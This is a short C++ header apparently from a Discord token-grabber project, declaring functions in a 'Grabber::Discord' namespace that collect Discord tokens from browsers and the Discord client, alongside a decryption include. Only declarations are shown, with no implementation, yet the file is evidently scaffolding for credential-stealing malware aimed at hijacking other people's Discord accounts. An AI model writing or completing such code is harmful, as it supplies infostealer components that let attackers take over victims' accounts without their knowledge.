#pragma once
#include <Windows.h>
#include <iostream>
 #include <set>
 #include <string>

#include <Utils.h>
#include <Decryption.h>

namespace Grabber {
	namespace Discord {

		void getTokenBrowserDiscord(std::set<std::string>& data);

		void getTokenDiscord(std::set<std::string>& tokens);

	}
}
